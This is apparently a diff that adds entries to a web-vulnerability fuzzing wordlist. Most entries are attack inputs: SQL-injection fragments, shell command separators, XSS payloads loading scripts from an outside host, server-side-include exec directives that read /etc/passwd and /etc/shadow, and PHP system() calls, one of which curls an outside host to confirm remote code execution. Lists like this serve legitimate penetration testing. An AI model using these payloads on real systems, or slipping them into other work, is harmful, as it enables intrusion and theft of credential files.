@@ -1,0 +1,43 @@
+52:PUT
+53:CrowdShield XSS Agent"><script/src=https://crowdshield.com/.testing/useragent.js>
+54:true
+55:1
+56:-1
+57:2
+58:4
+59:5
+60:7
+61:8
+62:9
+63:==
+64:=
+65:'
+66:' --
+67:' #
+68:'--
+69:'/*
+70:'#
+71:" --
+72:" #
+73:'\"
+74:`
+75:||
+76:|
+77:;
+78:'"
+79:"
+80:"'
+81:&
+82:&&
+83:%0a
+84:;echo '<script>alert(1)</script>'
+85:echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX
+86:<!--#exec cmd="/bin/cat /etc/passwd"-->
+87:<!--#exec cmd="/bin/cat /etc/shadow"-->
+88:\n
+89:<?php system("cat /etc/passwd");?>
+90:<?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
+91:pwd
+92:\r\n
+93:11
+94:1111
